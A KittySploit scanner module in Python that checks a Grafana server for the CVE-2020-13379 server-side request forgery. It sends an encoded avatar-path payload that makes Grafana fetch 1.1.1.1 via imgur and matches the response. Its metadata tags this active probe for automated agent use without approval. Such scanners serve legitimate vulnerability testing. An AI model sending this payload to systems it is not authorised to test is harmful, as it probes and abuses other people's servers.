#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Grafana 3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Grafana 3.0.1-7.0.1 - Server-Side Request Forgery Detection',
        'description': 'Grafana 3.0.1 through 7.0.1 is susceptible to server-side request forgery via the avatar feature, which can lead to remote code execution. Any unauthenticated user/client can make Grafana send HTTP requests to any URL and return its result. This can be used to gain information about the network Grafana is running on, thereby potentially enabling an attacker to obtain sensitive information, modify data, and/or execute unauthorized administrative operations in the context of the affected site.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'grafana', 'ssrf', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/advisories/GHSA-wc9w-wvq2-ffm9',
            'https://github.com/grafana/grafana/commit/ba953be95f0302c2ea80d23f1e5f2c1847365192',
            'http://www.openwall.com/lists/oss-security/2020/06/03/4',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-13379',
            'http://lists.opensuse.org/opensuse-security-announce/2020-06/msg00060.html',
        ],
        'cve': 'CVE-2020-13379',
    }

    def run(self):
        for path in ('/avatar/1%3fd%3dhttp%3A%252F%252Fimgur.com%252F..%25252F1.1.1.1', '/grafana/avatar/1%3fd%3dhttp%3A%252F%252Fimgur.com%252F..%25252F1.1.1.1'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            body_all = ('cloudflare.com', 'dns',)
            header_any = ('image/jpeg',)
            if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
                self.set_info(
                    severity='high',
                    reason="Grafana 3.0.1-7.0.1 - Server-Side Request Forgery detected",
                    path=path,
                )
                return True
        return False

